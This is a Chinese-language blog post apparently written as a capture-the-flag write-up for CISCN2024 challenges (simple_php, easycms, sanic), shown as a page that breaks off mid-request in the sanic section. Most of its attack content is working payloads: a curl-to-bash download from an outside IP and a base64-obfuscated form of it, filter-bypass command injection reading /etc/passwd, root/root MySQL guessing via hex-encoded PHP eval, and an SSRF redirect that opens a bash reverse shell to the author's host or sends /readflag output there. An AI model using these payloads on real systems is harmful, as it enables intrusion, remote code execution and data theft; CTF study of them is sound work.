<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="sanic污染冲"><title>CISCN2024</title><link rel=canonical href=https://baozongwi.xyz/p/ciscn2024/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="CISCN2024"><meta property='og:description' content="sanic污染冲"><meta property='og:url' content='https://baozongwi.xyz/p/ciscn2024/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='ssrf'><meta property='article:tag' content='php'><meta property='article:tag' content='jail'><meta property='article:published_time' content='2024-12-12T14:20:33+00:00'><meta property='article:modified_time' content='2024-12-12T14:20:33+00:00'><meta name=twitter:title content="CISCN2024"><meta name=twitter:description content="sanic污染冲"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#simple_php>simple_php</a></li><li><a href=#easycms>easycms</a></li><li><a href=#sanic>sanic</a></li><li><a href=#mossfern>mossfern</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ciscn2024/>CISCN2024</a></h2><h3 class=article-subtitle>sanic污染冲</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Dec 12, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><h1 id=0x01>0x01</h1><p>当时只做出了签到的php(bushi)，现在来看看</p><h1 id=0x02-question>0x02 question</h1><h2 id=simple_php>simple_php</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>,</span> <span class=s1>&#39;/var/www/html/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span> 
</span></span><span class=line><span class=cl>     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#39;|\&#34;|id|whoami/i&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>         <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>直接就可以弹shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://156.238.233.9/shell.sh|bash
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cmd=eval `ec\ho Y3VybCBo\dHRwOi8vMTU2LjIzOC4yMzMuOS9zaGVsbC5zaHxiYXNo|base\64 -d|s\h`
</span></span></code></pre></td></tr></table></div></div><p>本地通了但是ctfshow没成功，和<strong>大菜鸡</strong>师傅问了一下，原来是靶机没有bash，那么直接截断绕过其实也可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>93186233-bb78-435b-812e-67634ca5218e.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>6</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Google Chrome&#34;;v=&#34;131&#34;, &#34;Chromium&#34;;v=&#34;131&#34;, &#34;Not_A Brand&#34;;v=&#34;24&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://93186233-bb78-435b-812e-67634ca5218e.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://93186233-bb78-435b-812e-67634ca5218e.challenge.ctf.show/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cmd=ca%0at+/etc/passwd
</span></span></code></pre></td></tr></table></div></div><p>发现有mysql，再看看进程，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cmd=p%0as+-ef
</span></span></code></pre></td></tr></table></div></div><p>可以进数据库看看，什么情况，直接猜弱密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql -uroot -proot -e &#39;show databases;&#39;
</span></span></code></pre></td></tr></table></div></div><p>但是截断的这种打不了了，只能换了，还可以利用十六进制打，记得自己之前刷题的时候有做过，当时看着狗哥博客做的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php -r &#34;phpinfo();&#34;
</span></span><span class=line><span class=cl># 但是这个远程不行
</span></span><span class=line><span class=cl>php -r eval(hex2bin(substr(_xxxxxx,1)));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo `mysql -u root -p&#39;root&#39; -e &#39;show databases;&#39;`;
</span></span><span class=line><span class=cl>cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo `mysql -u root -p&#39;root&#39; -e &#39;use PHP_CMS;show tables;&#39;`;
</span></span><span class=line><span class=cl>cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b27603b,1)));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo `mysql -u root -p&#39;root&#39; -e &#39;use PHP_CMS;select * from F1ag_Se3Re7&#39;`;
</span></span><span class=line><span class=cl>cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f53653352653727603b,1)));
</span></span></code></pre></td></tr></table></div></div><h2 id=easycms>easycms</h2><p>打一个ssrf，302跳转打</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location:http://127.0.0.1/flag.php?cmd=bash%20-c%20&#39;bash%20-i%20&gt;&amp;%20/dev/tcp/156.238.233.9/4444%20&lt;&amp;1&#39;&#34;</span><span class=p>);</span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>但是还是不能弹shell，我们换成执行命令的就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;location:http://127.0.0.1/flag.php?cmd=curl http://156.238.233.9/a=`/readflag`&#34;</span><span class=p>);</span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://a.baozongwi.xyz/b.php
</span></span></code></pre></td></tr></table></div></div><h2 id=sanic>sanic</h2><p>这道题质量非常高，我什么时候能一样出这么好的题呢</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sanic</span> <span class=kn>import</span> <span class=n>Sanic</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sanic.response</span> <span class=kn>import</span> <span class=n>text</span><span class=p>,</span> <span class=n>html</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sanic_session</span> <span class=kn>import</span> <span class=n>Session</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pydash</span>
</span></span><span class=line><span class=cl><span class=c1># pydash==5.1.2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Pollute</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Sanic</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>static</span><span class=p>(</span><span class=s2>&#34;/static/&#34;</span><span class=p>,</span> <span class=s2>&#34;./static/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Session</span><span class=p>(</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>index</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>html</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;static/index.html&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>user</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>user</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;adm;n&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>ctx</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;login success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;login fail&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/src&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>src</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=vm>__file__</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/admin&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>admin</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>ctx</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>key</span> <span class=ow>and</span> <span class=n>value</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>str</span> <span class=ow>and</span> <span class=s1>&#39;_.&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>pollute</span> <span class=o>=</span> <span class=n>Pollute</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>pollute</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;forbidden&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;forbidden&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>首先就是<code>/login</code>路由的身份验证，但是因为是从cookie处获取，默认是<code>;</code>就给截断了，但是由于是python解析，我们可以使用进制绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/login</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>7e1d7bbf-ce2e-4af9-9132-1ff5afe3a9c9.challenge.ctf.show</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
